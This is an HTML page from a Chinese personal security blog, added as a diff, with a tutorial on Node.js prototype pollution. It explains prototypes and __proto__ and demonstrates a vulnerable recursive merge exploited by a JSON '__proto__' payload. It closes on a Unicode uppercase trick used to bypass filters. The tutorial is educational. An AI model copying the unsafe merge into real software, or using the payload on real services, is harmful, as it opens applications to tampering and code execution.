@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——nodejs原型链污染 | L1uxsn&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——nodejs原型链污染`
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://l1uxsn.github.io/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"SSRF","path":"2026/07/17/SSRF/"},{"title":"pickle反序列化","path":"2026/07/17/pickle反序列化/"},{"title":"nodejs原型链污染","path":"2026/07/17/nodejs原型链污染/"},{"title":"SQL注入相关","path":"2026/07/17/SQL注入相关/"},{"title":"twig与smarty模板的ssti","path":"2026/07/17/twig与smarty模板的ssti/"},{"title":"XXE漏洞","path":"2026/07/17/XXE漏洞/"},{"title":"Linux提权","path":"2026/07/17/Linux提权/"},{"title":"其他类型的数据库的注入","path":"2026/07/17/其他类型的数据库的注入/"},{"title":"python原型链污染","path":"2026/07/17/python原型链污染/"},{"title":"RCE","path":"2025/03/21/RCE/"},{"title":"sql提权","path":"2026/07/17/sql提权/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">L1uxsn.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag"></span>
+          <span class="main-left--tag"></span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“感谢永远有歌把心境道破”</p>
+        <p>“宏愿纵未了,奋斗总不太晚”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://L1uxsn.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>0</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>2 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>11 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1613天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">nodejs原型链污染</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-07-17 21:18:37</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="Nodejs原型链污染"><a href="#Nodejs原型链污染" class="headerlink" title="Nodejs原型链污染"></a>Nodejs原型链污染</h1><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p> 在 JavaScript 中，<strong>几乎所有的东西都是对象</strong>。对象就像是一个<strong>收纳盒</strong>，可以存放各种东西（属性）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个对象（收纳盒）</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>,    <span class="comment">// 存放名字</span></span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>           <span class="comment">// 存放年龄</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>);  <span class="comment">// 输出: Alice</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><p>每个对象都有一个<strong>原型</strong>（prototype），可以理解为<strong>备用收纳盒</strong></p>
+<p>当你在当前对象中找不到某个属性时，JavaScript 会自动去它的原型（备用盒）里找</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个空对象</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每个对象都有一个隐藏的&quot;备用盒&quot;（原型）</span></span><br><span class="line"><span class="comment">// 当访问 obj.toString 时，obj 本身没有 toString</span></span><br><span class="line"><span class="comment">// 就会去原型里找</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">toString</span>);  <span class="comment">// 输出: [Function: toString]（从原型找到的）</span></span><br><span class="line"></span><br><span class="line">obj 对象</span><br><span class="line">    ↓ (__proto__)</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">prototype</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> 是 <span class="title class_">JavaScript</span> 中所有对象的原型链顶端（除了 <span class="literal">null</span>）。它是一个特殊的对象，包含了所有对象共享的基础方法)</span><br><span class="line">    ├── <span class="title function_">toString</span>()</span><br><span class="line">    ├── <span class="title function_">hasOwnProperty</span>()</span><br><span class="line">    ├── <span class="title function_">valueOf</span>()</span><br><span class="line">    └── ... 其他方法</span><br><span class="line">    ↓ (__proto__)</span><br><span class="line"><span class="title function_">null</span> (原型链终点)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p><strong>原型链</strong>：对象的__proto__是原型，而原型也是一个对象，也有__proto__属性，原型的__proto_又是原型的原型，就这样可以一直通过__proto__向上找，这便是原型链，当向上找找到 object 的原型的时候，这条原型链便算结束了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj → 原型对象 → 原型的原型 → ... → <span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>之所以能形成原型链污染最基本的机制就是当在一个 son 对象中寻找一个属性，而子对象没有这个属性，那么就会去 <code>son.__proto__</code> 中寻找这个属性，如果仍然找不到，则继续在 <code>son.__proto__.__proto__</code> 中寻找，依次查找直到找到 null 结束。那么当我们需要某个对象的属性为 true 时，如果它没有这个属性，他就会去__proto__上找，这时我可以通过直接污染 object 对象的这个属性值为 true，使得我目标对象该属性为 true。</p>
+<p>示例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123;</span><br><span class="line">    <span class="attr">bar</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"><span class="keyword">const</span> zoo = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//foo.__proto__ 指向的是 Object.prototype</span></span><br><span class="line"><span class="comment">// 这行代码等价于：Object.prototype.bar = 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以在 Object.prototype 上添加了 bar 属性，值为 2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png"></p>
+<p>可以通过以下方式访问得到某一实例对象的原型对象，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png"></p>
+<p>剩下的 pp2rce 和 ejs 模板命令执行也是差不多的原理，主要是取决于污染什么属性。</p>
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染:"></a>原型链污染:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。</span><br><span class="line">攻击者可以利用这个特性，通过修改一个对象的原型链，来污染程序的行为。例如，攻击者可以在一个对象的原型链上设置一个恶意的属性或方法，当程序在后续的执行中访问该属性或方法时，就会执行攻击者的恶意代码</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>简单的说呢，其实就是我们对原链中的某个属性进行了污染，向其中插入恶意代码，当我们再调用这个链（也就是使用这个对象）时，我们的恶意代码就会被触发，此时就达到了一个执行恶意代码的效果</strong></p>
+<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a><code>__proto__</code>和prototype</h2><p>在<code>JavaScript</code>中，每个对象都有一个名为<code>__proto__</code>的内置属性，它指向该对象的原型。同时，每个函数也都有一个名为 <code>prototype </code>的属性，它是一个对象，包含构造函数的原型对象应该具有的属性和方法。简单来说，<code>__proto__ </code>属性是指向该对象的原型，而 <code>prototype</code>属性是用于创建该对象的构造函数的原型</p>
+<table>
+<thead>
+<tr>
+<th align="left">概念</th>
+<th align="left">谁有</th>
+<th align="left">是什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>__proto__</code></strong></td>
+<td align="left">所有对象都有</td>
+<td align="left">指向原型（自己的备用柜子）</td>
+</tr>
+<tr>
+<td align="left"><strong><code>prototype</code></strong></td>
+<td align="left">只有函数有</td>
+<td align="left">用来给新对象设置原型</td>
+</tr>
+</tbody></table>
+<p>代码示例:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Alice&#x27;</span>);</span><br><span class="line">person1.<span class="title function_">greet</span>(); <span class="comment">// 输出 &quot;Hello, my name is Alice&quot;</span></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span></span><br><span class="line">给 <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span> 添加 greet 方法,所有 <span class="title class_">Person</span> 的实例都会共享这个方法（通过原型链） </span><br><span class="line">person.<span class="title function_">greet</span>() <span class="title class_">Peron</span>本身没有greet方法，但是通过原型链找到greet方法，并进行调用</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 总结:</p>
+<p>1、prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法<br>2、一个对象的<code>__proto__</code>属性，指向这个对象所在的类的prototype属性</p>
+<h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程:"></a>具体过程:</h2><p>示例1:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;number : <span class="number">111</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = &#123;number : <span class="number">222</span>&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">number</span>=<span class="number">333</span></span><br><span class="line"><span class="keyword">var</span> c= &#123;&#125;</span><br><span class="line">c.<span class="property">number</span> <span class="comment">//333</span></span><br><span class="line"></span><br><span class="line">这里c没有number的值，于是在原型(objectprototype)中找到设定的number=<span class="number">333</span>,于是c.<span class="property">nymber</span>就为<span class="number">333</span></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">为什么执行过b.<span class="property">__proto__</span>.<span class="property">number</span>=<span class="number">520</span> 后，我们输出b的值，其值仍为<span class="number">1314</span></span><br><span class="line"></span><br><span class="line">这是因为在<span class="title class_">JavaScript</span>中存在这样一种继承机制：</span><br><span class="line">我们这里调用b.<span class="property">number</span>时，它的具体调用过程是如下所示的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、在b对象中寻找number属性</span><br><span class="line"><span class="number">2</span>、当在b对象中没有找到时，它会在b.<span class="property">__proto__</span>中寻找number属性</span><br><span class="line"><span class="number">3</span>、如果仍未找到，此时会去b.<span class="property">__proto__</span>.<span class="property">__proto__</span>中寻找number属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也就是说，它从自身开始寻找，然后一层一层向上递归寻找，直到找到或是递归到<span class="literal">null</span>为止，此机制被称为<span class="title class_">JavaScript</span>继承链，我们这里的污染的属性是在b.<span class="property">__proto__</span>中，而我们的b对象本身就有number，所以其值并未改变</span><br></pre></td></tr></table></figure>
+
+
+
+<p>示例2:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="comment">// 如果target与source有相同的键名 则让target的键值为source的键值</span></span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]  <span class="comment">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>) </span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>) </span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行过程:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始状态</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;           <span class="comment">// 空对象</span></span><br><span class="line"><span class="keyword">let</span> o2 = &#123;            <span class="comment">// 解析后</span></span><br><span class="line">  <span class="string">&quot;a&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 merge(o1, o2)</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历 o2 的键：</span></span><br><span class="line"><span class="comment">// 第一次循环：key = &quot;a&quot;</span></span><br><span class="line"><span class="comment">// - &quot;a&quot; 不在 o1 中 → </span></span><br><span class="line"></span><br><span class="line">o1.<span class="property">a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次循环：key = &quot;__proto__&quot;</span></span><br><span class="line"><span class="comment">// - &quot;__proto__&quot; 存在于 o1 中（因为所有对象都有 __proto__）</span></span><br><span class="line"><span class="comment">// - 递归调用 merge(o1.__proto__, &#123;&quot;b&quot;: 2&#125;)</span></span><br><span class="line"><span class="comment">// - 将 &#123;&quot;b&quot;: 2&#125; 合并到 o1 的原型上</span></span><br><span class="line"><span class="comment">// - 相当于：</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)  <span class="comment">// 输出: 1 2</span></span><br><span class="line"><span class="comment">// o1.b 不存在，但会沿着原型链找到 Object.prototype.b</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)        <span class="comment">// 输出: 2</span></span><br><span class="line"><span class="comment">// 所有新创建的对象都能访问到 b，因为原型被污染了</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="拓展-js大小写特性"><a href="#拓展-js大小写特性" class="headerlink" title="拓展(js大小写特性)"></a>拓展(js大小写特性)</h2><h3 id="toUpperCase-和toLowerCase"><a href="#toUpperCase-和toLowerCase" class="headerlink" title="toUpperCase()和toLowerCase"></a>toUpperCase()和toLowerCase</h3><p>这两个是 JavaScript 中用于<strong>改变字母大小写</strong>的方法，非常简单直观</p>
+<p><strong>toUpperCase() - 转大写</strong></p>
+<p>将字符串中的所有字母变成<strong>大写</strong>形式。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="string">&quot;hello&quot;</span>.<span class="title function_">toUpperCase</span>()     <span class="comment">// &quot;HELLO&quot;</span></span><br><span class="line"><span class="string">&quot;Hello World&quot;</span>.<span class="title function_">toUpperCase</span>() <span class="comment">// &quot;HELLO WORLD&quot;</span></span><br><span class="line"><span class="string">&quot;abc123&quot;</span>.<span class="title function_">toUpperCase</span>()    <span class="comment">// &quot;ABC123&quot; (数字不变)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>toLowerCase() - 转小写</strong></p>
+<p>将字符串中的所有字母变成<strong>小写</strong>形式。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="string">&quot;HELLO&quot;</span>.<span class="title function_">toLowerCase</span>()     <span class="comment">// &quot;hello&quot;</span></span><br><span class="line"><span class="string">&quot;Hello World&quot;</span>.<span class="title function_">toLowerCase</span>() <span class="comment">// &quot;hello world&quot;</span></span><br><span class="line"><span class="string">&quot;ABC123&quot;</span>.<span class="title function_">toLowerCase</span>()    <span class="comment">// &quot;abc123&quot; (数字不变)</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>对于<code>toUpperCase()</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;(拉丁小写点无点i)、&quot;ſ(拉丁长s)&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>
+
